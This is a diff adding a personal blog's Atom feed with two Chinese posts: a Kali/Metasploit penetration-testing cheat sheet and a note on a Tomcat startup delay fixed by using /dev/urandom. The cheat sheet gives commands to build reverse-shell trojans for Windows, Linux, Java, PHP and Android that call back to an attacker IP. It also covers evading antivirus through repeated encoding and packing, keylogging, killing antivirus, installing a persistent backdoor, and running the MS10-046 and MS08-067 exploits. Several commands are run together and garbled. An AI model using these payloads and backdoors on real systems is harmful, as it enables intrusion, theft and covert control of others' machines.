@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>若兮相言</title>
+  <subtitle>代码搬运工</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://rxxy.github.io/"/>
+  <updated>2017-08-28T01:23:24.868Z</updated>
+  <id>https://rxxy.github.io/</id>
+  
+  <author>
+    <name>Rxxy</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>kali渗透笔记</title>
+    <link href="https://rxxy.github.io/2016/12/26/cj6vkny8w00026gtw9zd8tty1/"/>
+    <id>https://rxxy.github.io/2016/12/26/cj6vkny8w00026gtw9zd8tty1/</id>
+    <published>2016-12-26T15:45:39.380Z</published>
+    <updated>2017-08-28T01:23:24.868Z</updated>
+    
+    <content type="html"><![CDATA[<p>#kali渗透笔记<br> Windows shellCode usege<br>/root生成木马hello.exe</p>
+<p>Lhost本机ip</p>
+<p>Lpost回连端口</p>
+<figure class="highlight plain"><figcaption><span>windows/meterpreter/reverse_tcp LHOST=192.168.159.128LPORT=1211 X或E >hello.exe</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; set payloadwindows/meterpreter/reverse_tcp</div><div class="line">payload=&gt; windows/meterpreter/reverse_tcp</div><div class="line">msfexploit(handler) &gt; set LHOST 192.168.159.128</div><div class="line">LHOST=&gt; 192.168.159.128</div><div class="line">msf exploit(handler) &gt; set LPORT1211</div><div class="line">LPORT =&gt; 1211</div><div class="line">msf exploit(handler) &gt; exploit``` 开始侦听，在目标端运行木马即可获取shell</div><div class="line"> </div><div class="line">##### linux下攻击载荷</div><div class="line">```msfpayloadlinux/x86/meterpreter/rverse_tcp LHOST=192.168.159.128 LPORT=1212 X &gt;hello.sh</div><div class="line">msf exploit(handler) &gt; set payloadlinux/x86/meterpreter/reverse_tcp</div><div class="line">payload =&gt;linux/x86/meterpreter/reverse_tcp</div></pre></td></tr></table></figure>
+<h5 id="java下攻击载荷"><a href="#java下攻击载荷" class="headerlink" title="java下攻击载荷"></a>java下攻击载荷</h5><figure class="highlight plain"><figcaption><span>java/meterpreter/reverse_tcp LHOST=192.168.159.128 LPORT=1212 X >hello.jar```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">##### php下攻击载荷</div><div class="line">```msfpayloadphp/meterpreter/reverse_tcp LHOST=192.168.159.128LPORT=1212 R &gt; 123.php</div></pre></td></tr></table></figure>
+<h5 id="Android下攻击载荷"><a href="#Android下攻击载荷" class="headerlink" title="Android下攻击载荷"></a>Android下攻击载荷</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfpayloadandroid/meterpreter/reverse_tcp LHOST=192.168.159.128 LPORT=7777 R&gt; /root/hello.apk</div></pre></td></tr></table></figure>
+<h5 id="shellCode免杀"><a href="#shellCode免杀" class="headerlink" title="shellCode免杀"></a>shellCode免杀</h5><h5 id="多重编码免杀-弱-："><a href="#多重编码免杀-弱-：" class="headerlink" title="多重编码免杀(弱)："></a>多重编码免杀(弱)：</h5><figure class="highlight plain"><figcaption><span>windows/meterpreter/rverse_tcpLHOST=192.168.159.128 LPORT=1212 R|Msfencode -ex86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw |msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5-t exe -o</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"> -o /root/hello.exe</div></pre></td></tr></table></figure>
+<h5 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h5><p>Upx -5hello.exe</p>
+<h5 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a>meterpreter基本命令</h5><blockquote>
+<p>screenshot截屏<br>sysinfo系统信息<br>ps查看进程<br>migrate 1323切换进程（使木马寄存在其他进程上）<br>Run post/windows/capture/keylog_recorder记录键盘输入</p>
+</blockquote>
+<h5 id="持久控制"><a href="#持久控制" class="headerlink" title="持久控制"></a>持久控制</h5><p>run post/windows/manage/migrate自动切换进程<br>run killav 关闭正在运行的cmd<br>服务器安装后门<br>run metsvc -A 安装后门<br>使用后门：<br>use exploit/multi/handler<br>set payloadwindows/metsvc_bind_tcp<br>set RHOST 192.168.159.1<br>set LPORT 31337<br>exploit</p>
+<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>Ms10-046<br>useexploit/windows/browser/ms10_046_shortcut_icon_dllloader<br>SRVHOST LHOST 设置为本机ip<br>Payload：   set payload windows/shell/reverse_tcp</p>
+<p>Ms08-067<br>set payloadwindows/meterpreter/reverse_tcp<br>RHOSTLHOST</p>
+<blockquote>
+<p>Targets:<br> 0  Automatic Targeting<br>   1  Windows 2000 Universal<br>   2  Windows XP SP0/SP1 Universal<br>   3  Windows 2003 SP0 Universal<br>   4  Windows XP SP2 English (AlwaysOn NX)<br>   5  Windows XP SP2 English (NX)<br>   6  Windows XP SP3 English (AlwaysOn NX)<br>   7  Windows XP SP3 English (NX)<br>   8  Windows XP SP2 Arabic (NX)<br>   9  Windows XP SP2 Chinese - Traditional / Taiwan (NX)<br>   10 Windows XP SP2 Chinese - Simplified (NX)<br>   11 Windows XP SP2 Chinese - Traditional (NX)<br>   12 Windows XP SP2 Czech (NX)<br>   13 Windows XP SP2 Danish (NX)<br>   14 Windows XP SP2 German (NX)<br>   15 Windows XP SP2 Greek (NX)<br>   16 Windows XP SP2 Spanish (NX)<br>   17 Windows XP SP2 Finnish (NX)<br>   18 Windows XP SP2 French (NX)<br>   19 Windows XP SP2 Hebrew (NX)<br>   20 Windows XP SP2 Hungarian (NX)<br>   21 Windows XP SP2 Italian (NX)<br>   22 Windows XP SP2 Japanese (NX)<br>   23 Windows XP SP2 Korean (NX)<br>   24 Windows XP SP2 Dutch (NX)<br>   25 Windows XP SP2 Norwegian (NX)<br>   26 Windows XP SP2 Polish (NX)<br>   27 Windows XP SP2 Portuguese - Brazilian (NX)<br>   28 Windows XP SP2 Portuguese (NX)<br>   29 Windows XP SP2 Russian (NX)<br>   30 Windows XP SP2 Swedish (NX)<br>   31 Windows XP SP2 Turkish (NX)<br>   32 Windows XP SP3 Arabic (NX)<br>   33 Windows XP SP3 Chinese - Traditional / Taiwan (NX)<br>   34 Windows XP SP3 Chinese - Simplified (NX)<br>   35 Windows XP SP3 Chinese - Traditional (NX)<br>   36 Windows XP SP3 Czech (NX)<br>   37 Windows XP SP3 Danish (NX)<br>   38 Windows XP SP3 German (NX)<br>   39 Windows XP SP3 Greek (NX)<br>   40 Windows XP SP3 Spanish (NX)<br>   41 Windows XP SP3 Finnish (NX)<br>   42 Windows XP SP3 French (NX)<br>   43 Windows XP SP3 Hebrew (NX)<br>   44 Windows XP SP3 Hungarian (NX)<br>   45 Windows XP SP3 Italian (NX)<br>   46 Windows XP SP3 Japanese (NX)<br>   47 Windows XP SP3 Korean (NX)<br>   48 Windows XP SP3 Dutch (NX)<br>   49 Windows XP SP3 Norwegian (NX)<br>   50 Windows XP SP3 Polish (NX)<br>   51 Windows XP SP3 Portuguese - Brazilian (NX)<br>   52 Windows XP SP3 Portuguese (NX)<br>   53 Windows XP SP3 Russian (NX)<br>   54 Windows XP SP3 Swedish (NX)<br>   55 Windows XP SP3 Turkish (NX)<br>   56 Windows 2003 SP1 English (NO NX)<br>   57 Windows 2003 SP1 English (NX)<br>   58 Windows 2003 SP1 Japanese (NO NX)<br>   59 Windows 2003 SP1 Spanish (NO NX)<br>   60 Windows 2003 SP1 Spanish (NX)<br>   61 Windows 2003 SP2 English (NO NX)<br>   62 Windows 2003 SP2 English (NX)<br>   63 Windows 2003 SP2 German (NO NX)<br>   64 Windows 2003 SP2 German (NX)<br>   65 Windows 2003 SP2 Portuguese - Brazilian (NX)<br>   66 Windows 2003 SP2 Spanish (NO NX)<br>   67 Windows 2003 SP2 Spanish (NX)<br>   68 Windows 2003 SP2 Japanese (NO NX)</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;#kali渗透笔记&lt;br&gt; Windows shellCode usege&lt;br&gt;/root生成木马hello.exe&lt;/p&gt;
+&lt;p&gt;Lhost本机ip&lt;/p&gt;
+&lt;p&gt;Lpost回连端口&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcap
+    
+    </summary>
+    
+    
+      <category term="kali" scheme="https://rxxy.github.io/tags/kali/"/>
+    
+      <category term="渗透" scheme="https://rxxy.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Tomcat 启动卡在部署项目时（linux）</title>
+    <link href="https://rxxy.github.io/2016/11/14/cj6vkny8m00006gtwtfi7pes6/"/>
+    <id>https://rxxy.github.io/2016/11/14/cj6vkny8m00006gtwtfi7pes6/</id>
+    <published>2016-11-14T12:26:58.817Z</published>
+    <updated>2017-08-28T01:23:51.196Z</updated>
+    
+    <content type="html"><![CDATA[<p>#Tomcat 启动卡在部署项目时（linux）</p>
+<p>找到<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">```securerandom.source=file:/dev/./urandom</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这时候根据修改内容就可以查到因为此原因不仅可以造成tomcat卡住，也会造成weblogic启动缓慢，<br>linux或者部分unix系统提供随机数设备是<code>/dev/random</code>和<code>/dev/urandom</code>，两个有区别，<br><code>urandom</code>安全性没有<code>random</code>高，但random需要时间间隔生成随机数。jdk默认调用random。<br>再后来，终于在weblogic的官方文档中 Monitoring and Troubleshooting 找到了 Avoiding JVM Delays Caused ByRandom Number Generation 这样一个标题。摘录如下：</p>
+<p>The library used for randomnumber generation in Sun’s JVM relies on /dev/random by default for UNIXplatforms. This can potentially block the Oracle WebLogic CommunicationServices process because on some operating systems /dev/random waits for acertain amount of “noise” to be generated on the host machine beforereturning a result. Although /dev/random is more secure, Oracle recommendsusing /dev/urandom if the default JVM configuration delays Oracle WebLogicCommunication Services startup.</p>
+<p>To determine if your operatingsystem exhibits this behavior, try displaying a portion of the file from ashell prompt:</p>
+<p>head -n 1 /dev/random<br>Open the<code>$JAVA_HOME/jre/lib/security/java.security</code> file in a text editor.</p>
+<p>Change the line:</p>
+<p>securerandom.source=file:/dev/random<br>to read:</p>
+<p>securerandom.source=file:/dev/urandom<br>Save your change and exit thetext editor.<br>其中说到：可通过 head -n 1 /devrandom 查看是否你的系统会出现伪随机数提供等待。OK就这个，试了一下，果然，在服务器第一次启动后，这个可以快速提供一个值，但当再次调用时发生等待。</p>
+</blockquote>
+<p>解决办法：</p>
+<p>永久：oracle 说修改$JAVA_HOME/jre/lib/security/java.security文件，替换<code>securerandom.source=file:/dev/random</code>为<code>securerandom.source=file:/dev/urandom</code>。对所有使用JVM的应用生效。（这个永久的方法，这里面有个问题，就是设置时候实际应该设置为<code>securerandom.source=file:/dev/./urandom</code>，否则不生效）</p>
+<p>DOMAIN临时：修改startWeblogic.sh文件，JAVA_OPTIONS=”${SAVE_JAVA_OPTIONS}-Djava.security.egd=file:/dev/./urandom”</p>
+<p>后继的SecureRandom 测试学习</p>
+<p>编写JAVA类如下，运行测试，第一次正常，第二次等待，重启服务器后第一次又正常。启动加入参数<code>-Djava.security.egd=file:/dev/./urandom</code> 正常</p>
+<p>来自<a href="[http://blog.csdn.net/njchenyi/article/details/46641141](http://blog.csdn.net/njchenyi/article/details/46641141)">[http://blog.csdn.net/njchenyi/article/details/46641141](http://blog.csdn.net/njchenyi/article/details/46641141)</a></p>
+<p>原文地址：<a href="http://blog.csdn.net/njchenyi/article/details/46641141" target="_blank" rel="external">http://blog.csdn.net/njchenyi/article/details/46641141</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;#Tomcat 启动卡在部署项目时（linux）&lt;/p&gt;
+&lt;p&gt;找到&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;
+    
+    </summary>
+    
+    
+      <category term="linux" scheme="https://rxxy.github.io/tags/linux/"/>
+    
+      <category term="tomcat" scheme="https://rxxy.github.io/tags/tomcat/"/>
+    
+  </entry>
+  
+</feed>
